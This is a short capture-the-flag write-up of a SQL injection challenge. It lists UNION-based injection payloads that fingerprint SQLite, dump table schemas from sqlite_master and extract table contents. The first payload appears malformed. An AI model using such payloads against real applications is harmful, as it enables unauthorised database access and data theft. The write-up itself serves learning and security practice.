I lost all my notes on this challenge so this solution was recreated after the
CTF ended. It was originally written in Python and gross.

I figured the original query was something like: `SELECT url, name FROM trolls WHERE name LIKE '%s'`

I used this query to figure out it was sqlite: `' OR 1=1 AND UNION ALL SELECT sqlite_version(), 1--`

I used this query to get all the tables, and their structure: `' OR 1=1 UNION ALL SELECT sql, name FROM sqlite_master WHERE type='table'--`.

I used this query to get the ids and letters from the tables: `' OR 1=1 UNION ALL SELECT id, letter FROM %s--`
